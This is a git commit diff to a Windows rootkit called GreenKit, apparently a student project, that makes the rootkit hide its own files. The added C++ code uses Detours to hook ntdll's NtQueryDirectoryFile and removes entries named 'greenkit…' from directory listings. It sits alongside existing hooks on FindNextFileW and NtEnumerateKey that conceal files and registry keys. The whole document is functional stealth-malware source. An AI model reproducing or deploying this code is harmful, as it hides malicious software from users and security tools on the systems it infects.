388dd72f271269ee729bcd648758bf4f66f6a586
Green <Green.Epita2016@gmail.com>
2015-07-14 15:54:21 +0200

    Greenkit now hides his own files

--- GreenKit/GreenKit.cpp
+++ GreenKit/GreenKit.cpp
@@ -11,6 +11,7 @@
 #include <windows.h>
 #include "Detours.h"
 #include "el_win_structs.h"
+#include "NtQueryDirectoryFile.h"
 //#include "NtEnumerateKey.h"
 
 #include <shlwapi.h>
@@ -49,8 +50,14 @@ FFFEx originalFFFEx;
 typedef BOOL(WINAPI *FNFW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
 BOOL WINAPI elFNFW(HANDLE findfile, LPWIN32_FIND_DATAW finddata);
 
+typedef NTSTATUS(WINAPI* TD_NtQueryDirectoryFile)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS, BOOLEAN, PUNICODE_STRING, BOOLEAN);
+
+
 FNFW oldFNFW;
 FNFW originalFNFW;
+
+TD_NtQueryDirectoryFile oldNtQueryDirectoryFile;
+TD_NtQueryDirectoryFile originalNtQueryDirectoryFile;
 
 /* NT ENUMERATE KEY */
 
@@ -264,6 +271,285 @@ NTSTATUS NTAPI NewNtEnumerateKey(
     return originalNtEnumerateKey(KeyHandle, Index + tmpInt, KeyInformationClass, KeyInformation, Length, ResultLength);
 }
 
+/* NT QUERY DIRECTORY FILE */
+
+BOOL _strCmp(const char *str1, const char *str2, int size) {
+	int i = 0;
+	for (i = 0; str1[i] && i < size; ++i) {
+		if (str2[i] != str1[i])
+			return FALSE;
+	}
+
+	return TRUE;
+}
+
+BOOL mustHideFile(UNICODE_STRING file) {
+	std::string a("greenkit.txt");
+	std::string b("greenkit.exe");
+	std::string c("greenkit");
+	char str[500];
+	wcstombs(str, file.Buffer, 500);
+	if (_strCmp(str, a.c_str(), 12))
+		return TRUE;
+	else if (_strCmp(str, b.c_str(), 12))
+		return TRUE;
+	else if (_strCmp(str, c.c_str(), 8))
+		return TRUE;
+	else
+		return FALSE;
+}
+DWORD getDirEntryLenToNext(
+	PVOID FileInformationBuffer,
+	FILE_INFORMATION_CLASS FileInfoClass
+	)
+{
+	DWORD dwResult = 0;
+	switch (FileInfoClass)
+	{
+	case FileDirectoryInformation:
+		dwResult = ((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->NextEntryOffset;
+		break;
+	case 2:
+		dwResult = ((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
+		break;
+	case 38:
+		dwResult = ((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
+		break;
+	case 3:
+		dwResult = ((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
+		break;
+	case 37:
+		dwResult = ((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
+		break;
+	case 12:
+		dwResult = ((PFILE_NAMES_INFORMATION)FileInformationBuffer)->NextEntryOffset;
+		break;
+	}
+	return dwResult;
+}
+
+// Given two directory entries, link them together in a list. 
+void setDirEntryLenToNext(
+	PVOID FileInformationBuffer,
+	FILE_INFORMATION_CLASS FileInfoClass,
+	DWORD value
+	)
+{
+	switch (FileInfoClass)
+	{
+	case FileDirectoryInformation:
+		((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
+		break;
+	case 2:
+		((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
+		break;
+	case 38:
+		((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
+		break;
+	case 3:
+		((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
+		break;
+	case 37:
+		((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
+		break;
+	case 12:
+		((PFILE_NAMES_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
+		break;
+	}
+}
+
+// Return the filename of the specified directory entry. 
+PVOID getDirEntryFileName(
+	PVOID FileInformationBuffer,
+	FILE_INFORMATION_CLASS FileInfoClass
+	)
+{
+	PVOID pvResult = NULL;
+	switch (FileInfoClass)
+	{
+	case FileDirectoryInformation:
+		pvResult = (PVOID)&((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->FileName[0];
+		break;
+	case 2:
+		pvResult = (PVOID)&((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
+		break;
+	case 38:
+		pvResult = (PVOID)&((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
+		break;
+	case 3:
+		pvResult = (PVOID)&((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
+		break;
+	case 37:
+		pvResult = (PVOID)&((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
+		break;
+	case 12:
+		pvResult = (PVOID)&((PFILE_NAMES_INFORMATION)FileInformationBuffer)->FileName[0];
+		break;
+	}
+	return pvResult;
+}
+
+// Return the length of the filename of the specified directory entry. 
+ULONG getDirEntryFileLength(PVOID FileInformationBuffer, FILE_INFORMATION_CLASS FileInfoClass)
+{
+	ULONG ulResult = 0;
+	switch (FileInfoClass)
+	{
+	case FileDirectoryInformation:
+		ulResult = (ULONG)((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->FileNameLength;
+		break;
+	case 2:
+		ulResult = (ULONG)((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
+		break;
+	case 38:
+		ulResult = (ULONG)((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
+		break;
+	case 3:
+		ulResult = (ULONG)((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
+		break;
+	case 37:
+		ulResult = (ULONG)((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
+		break;
+	case 12:
+		ulResult = (ULONG)((PFILE_NAMES_INFORMATION)FileInformationBuffer)->FileNameLength;
+		break;
+	}
+	return ulResult;
+}
+
+// ntdll.NtQueryDirectoryFile
+NTSTATUS WINAPI NewNtQueryDirectoryFile(
+	HANDLE hFile,
+	HANDLE hEvent,
+	PIO_APC_ROUTINE IoApcRoutine,
+	PVOID IoApcContext,
+	PIO_STATUS_BLOCK pIoStatusBlock,
+	PVOID FileInformationBuffer,
+	ULONG FileInformationBufferLength,
+	FILE_INFORMATION_CLASS FileInfoClass,
+	BOOLEAN bReturnOnlyOneEntry,
+	PUNICODE_STRING PathMask,
+	BOOLEAN bRestartQuery
+	)
+{
+	NTSTATUS rc;
+
+	// call original function
+	rc = originalNtQueryDirectoryFile(
+		hFile,
+		hEvent,
+		IoApcRoutine,
+		IoApcContext,
+		pIoStatusBlock,
+		FileInformationBuffer,
+		FileInformationBufferLength,
+		FileInfoClass,
+		bReturnOnlyOneEntry,
+		PathMask,
+		bRestartQuery
+		);
+
+	if (NT_SUCCESS(rc) &&
+		(FileInfoClass == FileDirectoryInformation ||
+		FileInfoClass == 2 ||
+		FileInfoClass == 38 ||
+		FileInfoClass == 3 ||
+		FileInfoClass == 37 ||
+		FileInfoClass == 12)
+		)
+	{
+		PVOID p = FileInformationBuffer;
+		PVOID pLast = NULL;
+		BOOL bLastOne, bFound;
+		UNICODE_STRING usName;
+		ANSI_STRING asName;
+		TD_RtlUniStringToAnsiString _RtlUnicodeStringToAnsiString = (NTSTATUS(WINAPI *)
+			(_Inout_ PANSI_STRING DestinationString, _In_ PUNICODE_STRING SourceString,
+			_In_ BOOLEAN AllocateDestinationString))GetProcAddress(GetModuleHandle("ntdll.dll"),
+			"RtlUnicodeStringToAnsiString");
+
+		TD_RtlFreeAnsiString  _RtlFreeAnsiString = (VOID(WINAPI *)
+			(_In_ PANSI_STRING AnsiString)) GetProcAddress(GetModuleHandle("ntdll.dll"),
+			"RtlFreeAnsiString");
+
+
+		if (bReturnOnlyOneEntry) // if only one entry returned we should give the next if it suppose to be hidden
+		{
+			usName.Buffer = (PWSTR)getDirEntryFileName(FileInformationBuffer, FileInfoClass);
+			usName.Length = (USHORT)getDirEntryFileLength(FileInformationBuffer, FileInfoClass);
+
+			_RtlUnicodeStringToAnsiString(&asName, &usName, TRUE);
+			bFound = mustHideFile(usName);
+			_RtlFreeAnsiString(&asName);
+
+			while (bFound)
+			{
+				rc = originalNtQueryDirectoryFile(
+					hFile,
+					hEvent,
+					IoApcRoutine,
+					IoApcContext,
+					pIoStatusBlock,
+					FileInformationBuffer,
+					FileInformationBufferLength,
+					FileInfoClass,
+					bReturnOnlyOneEntry,
+					PathMask,
+					bRestartQuery
+					);
+
+				if (rc != STATUS_SUCCESS)
+					return(rc);
+
+				usName.Buffer = (PWSTR)getDirEntryFileName(FileInformationBuffer, FileInfoClass);
+				usName.Length = (USHORT)getDirEntryFileLength(FileInformationBuffer, FileInfoClass);
+				_RtlUnicodeStringToAnsiString(&asName, &usName, TRUE);
+				bFound = mustHideFile(usName);
+				_RtlFreeAnsiString(&asName);
+			}
+		}
+		else // if full list hide the ones that should be hidden
+		{
+			do
+			{
+				bLastOne = !getDirEntryLenToNext(p, FileInfoClass);
+
+				// compare directory-name 
+				if (getDirEntryFileLength(p, FileInfoClass))
+				{
+					usName.Buffer = (PWSTR)getDirEntryFileName(p, FileInfoClass);
+					usName.Length = (USHORT)getDirEntryFileLength(p, FileInfoClass);
+					_RtlUnicodeStringToAnsiString(&asName, &usName, TRUE);
+					if (mustHideFile(usName))
+					{
+						_RtlFreeAnsiString(&asName);
+						if (bLastOne)
+						{
+							if (p == FileInformationBuffer) rc = 0x80000006;
+							else setDirEntryLenToNext(pLast, FileInfoClass, 0);
+							break;
+						}
+						else
+						{
+							int iPos = ((ULONG)p) - (ULONG)FileInformationBuffer;
+							int iLeft = (DWORD)FileInformationBufferLength - iPos - getDirEntryLenToNext(p, FileInfoClass);
+							RtlCopyMemory(p, (PVOID)((char*)p + getDirEntryLenToNext(p, FileInfoClass)), (DWORD)iLeft);
+							continue;
+						}
+					}
+					_RtlFreeAnsiString(&asName);
+				}
+
+				pLast = p;
+				p = ((char*)p + getDirEntryLenToNext(p, FileInfoClass));
+			} while (!bLastOne);
+		}
+	}
+
+	return rc;
+}
+/* END NT QUERY DIRECTORY FILE */
+
 	BOOL APIENTRY DllMain(HMODULE hModule,
 		DWORD  ul_reason_for_call,
 		LPVOID lpReserved
@@ -284,6 +570,9 @@ NTSTATUS NTAPI NewNtEnumerateKey(
             originalFNFW = (FNFW)DetourFunction((PBYTE)((FNFW)GetProcAddress(Kernel32, "FindNextFileW")), (PBYTE)elFNFW);
 
             originalNtEnumerateKey = (TD_NtEnumerateKey)DetourFunction((PBYTE)(TD_NtEnumerateKey)GetProcAddress(NtDll, "NtEnumerateKey"), (PBYTE)NewNtEnumerateKey);
+
+			oldNtQueryDirectoryFile = (TD_NtQueryDirectoryFile)GetProcAddress(NtDll, "NtQueryDirectoryFile");
+			originalNtQueryDirectoryFile = (TD_NtQueryDirectoryFile)DetourFunction((PBYTE)oldNtQueryDirectoryFile, (PBYTE)NewNtQueryDirectoryFile);
         
 		case DLL_THREAD_ATTACH:
 		case DLL_THREAD_DETACH:
